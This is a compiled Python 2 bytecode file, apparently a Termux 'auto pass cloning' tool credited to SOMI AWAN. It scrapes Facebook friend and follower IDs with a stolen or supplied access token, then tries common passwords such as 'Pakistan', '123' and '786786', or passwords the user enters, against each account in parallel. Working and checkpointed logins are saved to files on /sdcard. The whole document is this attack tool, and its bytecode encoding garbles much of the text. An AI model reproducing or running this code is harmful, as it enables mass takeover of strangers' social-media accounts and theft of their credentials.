ó
g`c           @   sl  y° d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z Wn8 e k
 rê e  j d  e  j d  e  j d  n Xy e  j d  Wn e k
 rn Xy e  j d  Wn e k
 r4n Xe  j d  d  d	 l m Z e j d
 d  Z e j d d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e e  e j d  d Z g  Z d Z d   Z d   Z  d    Z! d!   Z" d"   Z# d#   Z$ d$   Z% d%   Z& d&   Z' d'   Z( d(   Z) e* d) k rhe   n  d S(*   iÿÿÿÿN(   t
   ThreadPools   pip2 install requestss   pkg install nodejss   python2 hop.pys   /sdcard/idss   /sdcard/ids/ex_idss   git pull(   t   ConnectionErrorg    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-enginet   utf8s  
 [0;32m     _______  _______  _______ _________
 [0;32m    (  ____ \(  ___  )(       )\__   __/
 [0;32m    | (    \/| (   ) || () () |   ) (   
 [0;32m    | (_____ | |   | || || || |   | |   
 [0;31m    (_____  )| |   | || |(_)| |   | |   
 [0;31m          ) || |   | || |   | |   | |   
 [0;31m    /\____) || (___) || )   ( |___) (___
 [0;31m    \_______)(_______)|/     \|\_______/
     [105m[37;1mCODED BY SOMI-AWAN[0m
[1;97m-----------------------------------------------
[0;36mDEVOLPER    :   SOMI AWAN
[0;36mWHATSAAP    :   03455453538
[0;36mFACEBOOK    :   https://www.facebook.com/SO MI
[1;97m-----------------------------------------------
i    c           C   st   t  j d  y t d d  t   WnH t k
 ro t  j d  t GHd GHd GHd GHd GHd GHd GHt   n Xd  S(   Nt   clears
   .login.txtt   rt    s   	    [1;32mLOGIN MENU[0;97ms   (1) Login with tokens   (2) Login with id/pass(   t   ost   systemt   opent   menut   IOErrort   logot   login_select(    (    (    s   /sdcard/ok.pyt   login_choice-   s    c          C   s_   t  d  }  |  d k r" t   n9 |  d k r8 t   n# d GHd GHd GHt j d  t   d  S(   Ns   [1;33mChoose option: [0;97mt   1t   2R   s&   	    [1;31mSelect valid option[0;97mi   (   t	   raw_inputt   login_tokent   login_fbt   timet   sleepR   (   t   select(    (    s   /sdcard/ok.pyR   <   s    

c          C   s[  t  j d  t GHd GHd GHd GHt d  }  |  j d d  } | j d d  } | j d d  } t d  } d GHt j d	 | d
 | d t j } t	 j
 |  } d | k rü t d d  } | j | d  | j   t j d | d  t   n[ d | d k r<d GHd GHt j d  d GHt d  t   n d GHd GHt d  t   d  S(   NR   R   s%   	    [1;32mLOGIN WITH ID/PASS[0;97ms    Id/mail/number: t    t   (t   )s    Password: s   http://localhost:5000/auth?id=s   &pass=t   headerst   locs
   .login.txtt   wsG   https://graph.facebook.com/me/friends?uid=100048514350891&access_token=s   www.facebook.comt   errors8   	    [1;31mUser must verify account before login[0;97mi   s   	Press enter to back s(   	    [1;31mIncorrect credentials[0;97ms   Press enter to try again (   R   R	   R   R   t   replacet   requestst   gett   headert   textt   jsont   loadsR
   t   writet   closet   postR   R   R   R   (   t   idt   id1t   id2t   uidt   pwdt   datat   qt   hamza(    (    s   /sdcard/ok.pyR   H   s<    $




c          C   s·   t  j d  y% t d d  t j d  t   Wn~ t t f k
 r² t  j d  t GHd GHd GHd GHt	 d  }  t d d  } | j
 |   | j   t j d  t   n Xd  S(	   NR   s
   .login.txtR   i   R   s!   	    [1;32mFB TOKEN LOGIN[0;97ms    Paste token : R   (   R   R	   R
   R   R   R   t   KeyErrorR   R   R   R&   R'   (   t   tokent
   token_save(    (    s   /sdcard/ok.pyR   h   s"    
c          C   sO  t  j d  y t d d  j   }  WnF t k
 rn t  j d  d GHt GHd GHd GHt j d  t   n Xy9 t	 j
 d |  d t } t j | j  } | d	 } WnS t k
 rý t  j d  d GHt GHd GHd
 GHt j d  t  j d  t   n Xt  j d  t GHd GHd | d GHd GHd d GHd GHd GHd GHd GHt   d  S(   NR   s
   .login.txtR   R   s"   	    [1;31mToken not found[0;97mi   s+   https://graph.facebook.com/me?access_token=R   t   names    	    [1;31mToken expired[0;97ms   rm -rf .login.txts   	    [1;32mUser: s   [0;97mi/   t   -s   (1) Dump/Extract idss	   (0) Close(   R   R	   R
   t   readR   R   R   R   R   R    R!   R"   R$   R%   R#   R1   t   menu_option(   R2   R   t   aR4   (    (    s   /sdcard/ok.pyR   z   sF    	c          C   s~   t  d  }  |  d k r" t   nX |  d k r8 t   nB |  d k rN t   n, |  d k rd t   n d GHd GHd GHt   d  S(   Ns   [1;33mChoose option: [0;97mt   1111111t   111q2R   t   4R   s&   	    [1;31mSelect valid option[0;97m(   R   t   crackt   choicet   ex_idt   ex_fileR7   (   R   (    (    s   /sdcard/ok.pyR7      s    



c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd GHd GHd	 GHd
 GHd GHd GHt
   d  S(   NR   s
   .login.txtR   R   s"   	    [1;31mToken not found[0;97mi   s$   	    [1;32mAUTO PASS CLONING[0;97ms   [1] Crack public ids   [2] Crack followerss   [3] Crack files   [0] Back(   R   R	   R
   R6   R2   R   R   R   R   R   t   crack_select(    (    (    s   /sdcard/ok.pyR<   ®   s&    c             s   t  d  }  g  } g   g    |  d k rQt j d  t GHd GHd GHd GHt  d  } yD t j d | d t d	 t } t j	 | j
  } d
 | d GHWn, t k
 rÉ d GHd GHt  d  t   n Xt j d | d t d	 t } t j	 | j
  } xa| d D]B } | d } | d } | j d  d }	 | j | d |	  qWn|  d k rt j d  t GHd GHd GHd GHt  d  } yD t j d | d t d	 t } t j	 | j
  } d | d GHWn, t k
 rüd GHd GHt  d  t   n Xt j d | d t d d	 t } t j	 | j
  } x*| d D]B } | d } | d } | j d  d }	 | j | d |	  q?WnÙ |  d k r5t j d  t GHd GHd GHd GHyC t  d  }
 x0 t |
 d  j   D] } | j | j    qÚWWqat t f k
 r1d GHd GHd GHt  d  t   qaXn, |  d k rKt   n d GHd  GHd GHt   d! t t |   GHd" GHd# d$ GHd GH   f d%   } t d&  } | j | |  d GHd# d$ GHd GHd' GHd( t t    d) t t     GHd GHd# d$ GHd GHt  d  t   d  S(*   Ns   [1;33mChoose option: [0;97mR   R   R   s)   	    [1;32mAUTO PASS PUBLIC CRACK[0;97ms    Input id: s   https://graph.facebook.com/s   ?access_token=R   s    Cloning from : R4   s.   	    [1;31mLogged in id has checkpoint[0;97ms    Press enter to backs   /friends?access_token=R.   R)   R   i    t   |R   s,   	    [1;32mAUTO PASS CRACK FOLLOWERS[0;97ms    Cloning from: s   /subscribers?access_token=s   &limit=999999t   3s'   	    [1;32mAUTO PASS FILE CRACK[0;97ms   [+] File : R   s+   	    [1;31mRequested file not found[0;97ms    Press enter to back t   0s&   	    [1;31mSelect valid option[0;97ms    Total IDs : s    The Process has startedi/   R5   c            sh  |  } | j  d  \ } } y?d } t j d | d | d t j } t j |  } d | k r¾ d | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nd | d k r%d | d | GHt d d  } | j | d | d  | j	     j
 | |  n4| d }	 t j d | d |	 d t j } t j |  } d | k rÉd | d |	 d	 GHt d
 d  } | j | d |	 d  | j	    j
 | |	  nd | d k r0d | d |	 GHt d d  } | j | d |	 d  | j	     j
 | |	  n)| d }
 t j d | d |
 d t j } t j |  } d | k rÔd | d |
 d	 GHt d
 d  } | j | d |
 d  | j	    j
 | |
  nd | d k r;d | d |
 GHt d d  } | j | d |
 d  | j	     j
 | |
  n| d } t j d | d | d t j } t j |  } d | k rßd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nzd | d k rFd | d | GHt d d  } | j | d | d  | j	     j | |  n| d } t j d | d | d t j } t j |  } d | k rêd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nod | d k rQd | d | GHt d d  } | j | d | d  | j	     j
 | |  nd } t j d | d |  j } t j |  } d | k rëd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  nnd | d k rRd | d | GHt d d  } | j | d | d  | j	     j
 | |  nd } t j d | d | d t j } t j |  } d | k ròd | d | d	 GHt d
 d  } | j | d | d  | j	    j
 | |  ng d | d k rYd | d | GHt d d  } | j | d | d  | j	     j
 | |  n  Wn n Xd  S(   NRA   t   Pakistans   http://localhost:5000/auth?id=s   &pass=R   R   s   [1;37m[Checkpoint] [1;37ms    | s   [0;97ms   /sdcard/ids/checkpoint.txtR8   s   
s   www.facebook.comR   s   [Checkpoint] s   checkpoint.txtt   123t   1234t   12345t   786t   000786t   786786s   [1;37m[Checkpoint] [1;30m(   t   splitR    R!   R"   R#   R$   R%   R
   R&   R'   t   appendt   apppend(   t   argt   userR,   R4   t   pass1R.   R/   t   okt   cpt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   cpst   oks(    s   /sdcard/ok.pyt   main  sÜ    $


$


$


$


$



$

i   s    The process has completeds    Total Ok/Cp:t   /(   R   R   R	   R   R    R!   R2   R"   R$   R%   R#   R1   R<   t   rsplitRL   R
   t	   readlinest   stripR   R   R@   t   strt   lenR    t   map(   R   R)   t   idtR   R/   t   zt   iR,   t   nat   nmt   filelistt   lineR[   t   p(    (   RY   RZ   s   /sdcard/ok.pyR@   Ã   s²    !
!

!
%



	~	)	
c    	      C   s-  g  }  y t  d d  j   a Wn/ t k
 rP d GHd GHt j d  t   n Xt j d  t	 GHd GHd GHd GHt
 d  } yD t j d	 | d
 t d t } t j | j  } d | d GHWn1 t k
 rõ d GHd GHd GHt
 d  t   n Xt j d	 | d t d t } t j | j  } t  d d  } xg | d D][ } | d } | d } | j d  d } |  j | d |  | j | d | d  qCW| j   d GHd d GHd GHd GHd t t |    GHd GHd d GHd GHt
 d  t j d  t j d  d  GHt j d  t   d  S(!   Ns
   .login.txtR   s"   	    [1;31mToken not found[0;97mR   i   R   s/   	    [1;32mCOLLECT PUBLIC ID FRIENDLIST[0;97ms    Input Id: s   https://graph.facebook.com/s   ?access_token=R   s    Collecting from: R4   s.   	    [1;31mLogged in id has checkpoint[0;97ms    Press enter to backs   /friends?access_token=s   ids_friends.txtR   R.   R)   R   i    RA   s   
i/   R5   s    The process has completeds    Total ids: s    Press enter to download files   cp ids_friends.txt /sdcards   rm -rf ids_friends.txts    File downloaded successfully(   R
   R6   R2   R   R   R   R   R   R	   R   R   R    R!   R"   R$   R%   R#   R1   R<   R]   RL   R&   R'   R`   Ra   R   (	   t   idgt   idhR   R/   t   idsRe   R,   Rf   Rg   (    (    s   /sdcard/ok.pyR>     s`    !
!


		
c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd GHd GHd	 GHd
 GHd GHd GHt
   d  S(   NR   s
   .login.txtR   R   s"   	    [1;31mToken not found[0;97mi   s)   	    [1;32mCHOICE PASS CRACK MENU[0;97ms   [1] Crack public ids   [2] Crack followerss   [3] Crack files   [0] Back(   R   R	   R
   R6   R2   R   R   R   R   R   t   choice_select(    (    (    s   /sdcard/ok.pyR=   Í  s&    c             s¼  t  d  }  g  } g   g    |  d k rt j d  t GHd GHd GHd GHt  d   t  d   t  d   t  d   t  d  } yD t j d | d	 t d
 t } t j	 | j
  } d | d GHWn, t k
 rù d GHd GHt  d  t   n Xt j d | d t d
 t } t j	 | j
  } xÁ| d D]B } | d } | d } | j d  d }	 | j | d |	  q8Wnp|  d k rèt j d  t GHd GHd GHd GHt  d   t  d   t  d   t  d   t  d  } yD t j d | d	 t d
 t } t j	 | j
  } d | d GHWn, t k
 r\d GHd GHt  d  t   n Xt j d | d t d d
 t } t j	 | j
  } xZ| d D]B } | d } | d } | j d  d }	 | j | d |	  qWn	|  d k rÅt j d  t GHd GHd GHd GHt  d   t  d   t  d   t  d   t  d  }
 y7 x0 t |
 d  j   D] } | j | j    qjWWqñt t f k
 rÁd GHd GHd GHt  d  t   qñXn, |  d  k rÛt   n d GHd! GHd GHt   d" t t |   GHd# GHd$ d% GHd GH       f d&   } t d'  } | j | |  d GHd$ d% GHd GHd( GHd) t t    d* t t     GHd GHd$ d% GHd GHt  d  t   d  S(+   Ns   [1;33mChoose option: [0;97mR   R   R   s+   	    [1;32mCHOICE PASS PUBLIC CRACK[0;97ms    Password: s    Input id: s   https://graph.facebook.com/s   ?access_token=R   s    Cloning from : R4   s.   	    [1;31mLogged in id has checkpoint[0;97ms    Press enter to backs   /friends?access_token=R.   R)   R   i    RA   R   s,   	    [1;32mAUTO PASS CRACK FOLLOWERS[0;97ms    Cloning from: s   /subscribers?access_token=s   &limit=999999RB   s'   	    [1;32mAUTO PASS FILE CRACK[0;97ms    Input file: R   s+   	    [1;31mRequested file not found[0;97ms    Press enter to back RC   s&   	    [1;31mSelect valid option[0;97ms    Total IDs : s    The Process has startedi/   R5   c            s1  |  } | j  d  \ } } yt j d | d  d t j } t j |  } d | k r¸ d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   njd | d k rd | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r¹d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nid | d k r d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k rºd | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nhd | d k r!d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r»d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   ng d | d k r"d | d  GHt d d
  } | j | d  d  | j	     j |   n  Wn n Xd  S(   NRA   s   http://localhost:5000/auth?id=s   &pass=R   R   s   [1;37m[Checkpoint] [1;37ms    | s   [0;97ms   /sdcard/ids/checkpoint.txtR8   s   
s   www.facebook.comR   s   [Checkpoint] s   checkpoint.txt(   RK   R    R!   R"   R#   R$   R%   R
   R&   R'   RL   RM   (   RN   RO   R,   R4   R.   R/   RQ   RR   (   RY   RZ   RP   RS   RT   RU   (    s   /sdcard/ok.pyR[   <  sz    $

$

$

$

i   s    The process has completeds    Total Ok/Cp:R\   (   R   R   R	   R   R    R!   R2   R"   R$   R%   R#   R1   R=   R]   RL   R
   R^   R_   R   R   Rn   R`   Ra   R    Rb   (   R   R)   Rc   R   R/   Rd   Re   R,   Rf   Rg   Rh   Ri   R[   Rj   (    (   RY   RZ   RP   RS   RT   RU   s   /sdcard/ok.pyRn   â  sÊ    !
!

!
%



	H	)	
t   __main__(+   R   t   sysR   t   datetimet   randomt   hashlibt   ret	   threadingR$   t   getpasst   urllibt	   cookielibR    t   multiprocessing.poolR    t   ImportErrorR	   t   mkdirt   OSErrort   requests.exceptionsR   t   randintt   bdt   simt   reprR"   t   reloadt   setdefaultencodingR   Rl   t   backR   R   R   R   R   R7   R<   R@   R>   R=   Rn   t   __name__(    (    (    s   /sdcard/ok.pyt   <module>   sJ   P
			 		%			Ø	2		®


	